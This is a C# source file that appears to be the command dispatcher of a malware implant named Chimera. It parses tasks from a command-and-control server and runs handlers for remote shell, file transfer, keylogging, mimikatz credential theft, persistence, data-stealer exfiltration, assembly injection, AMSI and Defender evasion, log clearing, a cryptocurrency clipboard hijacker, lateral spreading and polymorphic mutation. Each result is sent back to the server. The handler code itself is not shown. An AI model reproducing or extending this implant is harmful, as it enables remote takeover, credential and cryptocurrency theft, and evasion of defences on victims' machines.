using System;

namespace Chimera
{
    public static class Tasking
    {
        public static string CallbackUUID = "";

        public static bool ParseCheckinResponse(string json)
        {
            try
            {
                if (json == null) return false;
                string id = ExtractJsonValue(json, "id");
                if (!string.IsNullOrEmpty(id))
                {
                    CallbackUUID = id;
                    return true;
                }
                return false;
            }
            catch { return false; }
        }

        public static void Dispatch(string json)
        {
            try
            {
                if (json == null) return;

                int tasksStart = json.IndexOf("\"tasks\":");
                if (tasksStart == -1) return;

                int arrStart = json.IndexOf("[", tasksStart);
                int arrEnd   = json.IndexOf("]", arrStart);
                if (arrEnd - arrStart <= 1) return;

                string tasksContent = json.Substring(arrStart + 1,
                    arrEnd - arrStart - 1).Trim();
                if (tasksContent.Length == 0) return;

                string taskID     = ExtractJsonValue(tasksContent, "id");
                string command    = ExtractJsonValue(tasksContent, "command");
                string parameters = ExtractJsonValue(tasksContent, "parameters");

                if (string.IsNullOrEmpty(taskID) || string.IsNullOrEmpty(command))
                    return;

                string output = "";

                switch (command.ToLower())
                {
                    // --------------------------------------------------------
                    // Core
                    // --------------------------------------------------------
                    case "shell":
                        output = Commands.Shell.Execute(parameters);
                        break;

                    case "upload":
                        output = Commands.Upload.Execute(parameters, taskID, CallbackUUID);
                        break;

                    case "download":
                        output = Commands.Download.Execute(parameters, taskID, CallbackUUID);
                        break;

                    case "ls":
                        output = Commands.Ls.Execute(parameters);
                        break;

                    case "pwd":
                        output = Commands.Pwd.Execute();
                        break;

                    case "cd":
                        output = Commands.Cd.Execute(parameters);
                        break;

                    case "sleep":
                        output = Commands.Sleep.Execute(parameters);
                        break;

                    case "kill":
                        C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
                        Environment.Exit(0);
                        return;

                    // --------------------------------------------------------
                    // Recon / post-exploitation
                    // --------------------------------------------------------
                    case "ps":
                        output = Commands.Ps.Execute();
                        break;

                    case "screenshot":
                        output = Commands.Screenshot.Execute(taskID, CallbackUUID);
                        break;

                    case "keylog":
                        output = Commands.Keylogger.Execute(parameters);
                        break;

                    case "mimikatz":
                        output = Commands.Mimikatz.Execute();
                        break;

                    // --------------------------------------------------------
                    // Persistence
                    // --------------------------------------------------------
                    case "persist":
                        output = (parameters != null &&
                                  parameters.Trim().ToLower() == "remove")
                            ? Commands.Persist.Remove()
                            : Commands.Persist.Execute();
                        break;

                    case "persist2":
                        output = Commands.Persist2.Execute(parameters);
                        break;

                    case "stealer_exfil":
                        output = Commands.StealerExfil.Execute(taskID, CallbackUUID);
                        break;

                    // --------------------------------------------------------
                    // Injection / stealer
                    // --------------------------------------------------------
                    case "inject_assembly":
                        output = Commands.InjectAssembly.Execute(
                            parameters, taskID, CallbackUUID);
                        break;

                    case "run_stealer":
                        output = Commands.InjectAssembly.Execute(
                            "run_stealer", taskID, CallbackUUID);
                        break;

                    // --------------------------------------------------------
                    // Evasion / elevation
                    // --------------------------------------------------------
                    case "runas_exec":
                    case "bypass":
                        output = Commands.RunasExec.Execute(parameters);
                        break;

                    case "amsi_bypass":
                        output = Commands.AmsiBypass.Execute();
                        break;

                    case "defender_excl":
                        output = Commands.DefenderExclusion.Execute();
                        break;

                    case "clearlogs":
                        output = Commands.ClearLogs.Execute();
                        break;

                    // --------------------------------------------------------
                    // Crypto hijacking
                    // --------------------------------------------------------
                    case "clipper":
                        output = Commands.Clipper.Execute(parameters);
                        break;

                    // --------------------------------------------------------
                    // Lateral movement
                    // --------------------------------------------------------
                    case "spread":
                        output = Commands.Spread.Execute(parameters);
                        break;

                    // --------------------------------------------------------
                    // Loot collection
                    // --------------------------------------------------------
                    case "collect":
                        output = Commands.Collect.Execute(taskID, CallbackUUID);
                        break;

                    // --------------------------------------------------------
                    // Polymorphic mutation
                    // --------------------------------------------------------
                    case "mutate":
                        output = Commands.Mutate.Execute(parameters);
                        break;

                    // --------------------------------------------------------
                    // C2 resilience configuration
                    // --------------------------------------------------------
                    case "c2config":
                        output = Commands.C2Config.Execute(parameters);
                        break;

                    // --------------------------------------------------------
                    // Health check
                    // --------------------------------------------------------
                    case "check_health":
                        output = Commands.CheckHealth.Execute();
                        break;

                    // --------------------------------------------------------
                    // Help
                    // --------------------------------------------------------
                    case "help":
                        output = Commands.Help.Execute();
                        break;

                    default:
                        output = "Unknown command: " + command;
                        break;
                }

                C2Http.PostResponse(CallbackUUID, taskID, output);
            }
            catch { }
        }

        public static string ExtractJsonValue(string json, string key)
        {
            try
            {
                string search = "\"" + key + "\":";
                int keyIdx = json.IndexOf(search);
                if (keyIdx == -1) return null;

                int valueStart = keyIdx + search.Length;
                while (valueStart < json.Length && json[valueStart] == ' ')
                    valueStart++;

                if (valueStart >= json.Length) return null;

                if (json[valueStart] == '"')
                {
                    valueStart++;
                    int valueEnd = valueStart;
                    while (valueEnd < json.Length)
                    {
                        if (json[valueEnd] == '"' && json[valueEnd - 1] != '\\')
                            break;
                        valueEnd++;
                    }
                    return json.Substring(valueStart, valueEnd - valueStart);
                }
                else
                {
                    int valueEnd = valueStart;
                    while (valueEnd < json.Length &&
                           json[valueEnd] != ',' &&
                           json[valueEnd] != '}' &&
                           json[valueEnd] != ']')
                        valueEnd++;
                    return json.Substring(valueStart, valueEnd - valueStart).Trim();
                }
            }
            catch { return null; }
        }
    }
}
